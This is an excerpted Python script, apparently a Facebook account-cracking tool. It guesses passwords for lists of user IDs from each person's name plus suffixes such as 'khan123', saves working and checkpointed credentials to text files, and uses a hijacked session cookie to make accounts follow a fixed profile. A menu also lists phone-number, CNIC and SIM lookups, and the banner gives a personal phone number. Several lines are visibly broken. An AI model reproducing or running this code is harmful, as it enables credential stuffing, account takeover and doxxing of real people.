...
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/116.0.0.10.109;]"}
...
logo="""
db   d8b   db  .d8b.     d88b d888888b d8888b. 
88   I8I   88 d8' `8b    `8P'   `88'   88  `8D 
88   I8I   88 88ooo88     88     88    88   88 
Y8   I8I   88 88~~~88     88     88    88   88 
`8b d8'8b d8' 88   88 db. 88    .88.   88  .8D 
 `8b8' `8d8'  YP   YP Y8888P  Y888888P Y8888D'
-------------------------------
NAME           WAJID
FB             XD
FRIEND         RASHID BALOUCX
WHATSAP        0303 6694715
-------------------------------"""
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mRASHID_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mRASHID_CP.txt' % (H, P, str(len(cp))))
...
def sarfraz():
    ...
    print(' [2] NUMBER TRACE')
    print(' [3] CNIC INFORMAITOIN')
    print(' [4] SIM NUMBER INFO ')
    print('')
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;92m[wajid] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                header = {
                    ...
                    "user-agent":"Mozilla/5.0 (Linux; Android 11; V2149) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.155.162.235 Mobile Safari/537.36",
                ...
                header1 = {
                    ...
                    "user-agent":"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/119.155.162.235 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        pass
                    print('\r%s [Rs-CP] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('Rs_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
    ...
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://api.facebook.com/profile.php?id=100047478438997', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://api.facebook.com' + str(get)), cookies={'cookie': coki}).text
            ...
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"khan123", xz[0]+xz[1], xz[0]+"123"]
                        else:
                            pwx = [name, xz[0]+"baloch", xz[0]+xz[1], xz[0]+"baba"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
